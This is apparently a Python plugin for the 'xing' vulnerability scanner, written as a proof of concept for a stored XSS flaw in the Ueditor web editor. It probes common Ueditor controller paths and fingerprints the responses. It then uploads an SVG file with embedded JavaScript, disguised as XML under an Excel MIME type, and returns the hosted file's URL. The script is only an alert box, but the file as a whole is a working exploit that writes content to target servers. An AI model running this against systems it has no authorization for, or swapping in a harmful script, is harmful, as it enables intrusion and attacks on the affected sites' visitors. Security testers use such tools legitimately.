import urllib.parse

from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Ueditor 存储 XSS 漏洞"
        self.app_name = 'Ueditor'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]


    def verify(self, target):
        payload = "?action=uploadfile"
        paths = ["/ueditor/php/controller.php", "/Public/ueditor/php/controller.php"]
        paths.extend(["/js/ueditor/php/controller.php"])
        paths.extend(["/statics/ueditor/php/controller.php"])
        paths.extend(["/module/ueditor/php/controller.php"])
        paths.extend(["/ueditor/jsp/controller.jsp"])

        check_paths = [b'{"state":"\\u8bf7\\u6c42\\u5730\\u5740\\u51fa\\u9519"}']
        check_paths.extend([br'{"state": "\u65e0\u6548\u7684Action"}'])
        check_paths.extend([b'upload method not exists'])

        self.logger.info(f"verify {target}")

        for path in paths:
            url = target + path
            conn = http_req(url)
            for check_path in check_paths:
                if check_path in conn.content and b"<" not in conn.content:
                    self.logger.info(f"found ueditor controller {url}")
                    upload_url = url + payload
                    poc_url = self._upload_xss(upload_url)
                    if  poc_url:
                        self.logger.success(f"found vul {poc_url}")
                        return poc_url
                    return


    def _upload_xss(self, url):
        file_data = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(111);
   </script>
</svg>'''
        files = {'upfile': ('1.xml', file_data, 'application/vnd.ms-excel')}        

        conn_poc = http_req(url, method='post', files=files)
        if b'"SUCCESS"' in conn_poc.content:
            self.logger.info(f"upload success {url}")
            ret = conn_poc.json()
            poc_url = ret.get("url", "")
            if ".xml" in poc_url:
                return urllib.parse.urljoin(url, poc_url)
